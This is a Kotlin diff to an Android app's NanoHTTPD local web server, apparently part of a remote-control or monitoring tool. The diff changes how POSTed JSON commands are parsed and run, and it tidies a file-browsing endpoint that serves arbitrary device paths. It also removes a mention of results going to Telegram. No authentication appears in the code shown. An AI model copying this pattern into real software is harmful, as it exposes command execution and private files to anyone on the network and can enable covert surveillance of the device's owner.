@@ -4,6 +4,7 @@ import fi.iki.elonen.NanoHTTPD
 import android.content.Context
 import android.util.Log
 import org.json.JSONObject
+import org.json.JSONArray
 import java.io.File
 import java.io.FileInputStream
 import java.io.InputStream
@@ -31,22 +32,39 @@ class LocalWebServer(private val context: Context, port: Int) : NanoHTTPD("::", 
         return try {
             val map = mutableMapOf<String, String>()
             session.parseBody(map)
-            val jsonStr = map["postData"] ?: "{}"
             
-            // Execute command and wait for immediate response (synchronous part)
-            val result = commandHandler.handle(jsonStr) { /* Ignore async callback for direct web requests */ }
+            // NanoHTTPD parsing body results in parameters being populated or files if it's multipart
+            // We'll prefer looking at session.parameters["postData"] or reading raw body
+            var jsonStr = session.parameters["postData"]?.get(0)
+            
+            if (jsonStr == null) {
+                // Fallback: Read raw body if not form-encoded
+                val contentLength = session.headers["content-length"]?.toIntOrNull() ?: 0
+                if (contentLength > 0) {
+                    val buffer = ByteArray(contentLength)
+                    session.inputStream.read(buffer, 0, contentLength)
+                    jsonStr = String(buffer)
+                }
+            }
+
+            if (jsonStr == null || jsonStr.isEmpty()) {
+                jsonStr = "{}"
+            }
+
+            Log.d("LocalWebServer", "Executing command: $jsonStr")
+            val result = commandHandler.handle(jsonStr) { /* Async ignored */ }
             
             if (result != null) {
                 newFixedLengthResponse(Response.Status.OK, "application/json", result)
             } else {
-                // Command is async (like recording), return a placeholder
                 val asyncResp = JSONObject().apply {
                     put("type", "async_started")
-                    put("data", "Command started in background. Result will be in Telegram/Logs.")
+                    put("data", "Command started in background.")
                 }
                 newFixedLengthResponse(Response.Status.OK, "application/json", asyncResp.toString())
             }
         } catch (e: Exception) {
+            Log.e("LocalWebServer", "Error processing command", e)
             newFixedLengthResponse(Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, "Error: ${e.message}")
         }
     }
@@ -65,7 +83,6 @@ class LocalWebServer(private val context: Context, port: Int) : NanoHTTPD("::", 
             put("status", "online")
             put("model", android.os.Build.MODEL)
             put("android_version", android.os.Build.VERSION.RELEASE)
-            put("ipv6", "Enabled")
         }
         return newFixedLengthResponse(Response.Status.OK, "application/json", info.toString())
     }
@@ -74,26 +91,28 @@ class LocalWebServer(private val context: Context, port: Int) : NanoHTTPD("::", 
         val path = session.parameters["path"]?.get(0) ?: "/storage/emulated/0"
         val file = File(path)
 
-        if (!file.exists()) {
-            return newFixedLengthResponse(Response.Status.NOT_FOUND, MIME_PLAINTEXT, "File not found")
-        }
+        if (!file.exists()) return newFixedLengthResponse(Response.Status.NOT_FOUND, MIME_PLAINTEXT, "Not found")
 
         return if (file.isDirectory) {
-            val filesList = file.listFiles()?.map {
-                JSONObject().apply {
+            val files = file.listFiles()?.toList() ?: emptyList()
+            // URUTAN: Folder dulu (A-Z), baru File (A-Z)
+            val sortedFiles = files.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
+            
+            val jsonArray = JSONArray()
+            sortedFiles.forEach {
+                jsonArray.put(JSONObject().apply {
                     put("name", it.name)
                     put("is_dir", it.isDirectory)
                     put("path", it.absolutePath)
                     put("size", it.length())
-                }
-            } ?: emptyList()
-            newFixedLengthResponse(Response.Status.OK, "application/json", filesList.joinToString(",", "[", "]"))
+                })
+            }
+            newFixedLengthResponse(Response.Status.OK, "application/json", jsonArray.toString())
         } else {
             try {
-                val inputStream: InputStream = FileInputStream(file)
-                newFixedLengthResponse(Response.Status.OK, resolveMimeType(file.name), inputStream, file.length())
+                newFixedLengthResponse(Response.Status.OK, resolveMimeType(file.name), FileInputStream(file), file.length())
             } catch (e: Exception) {
-                newFixedLengthResponse(Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, "Error reading file")
+                newFixedLengthResponse(Response.Status.INTERNAL_ERROR, MIME_PLAINTEXT, "Read error")
             }
         }
     }
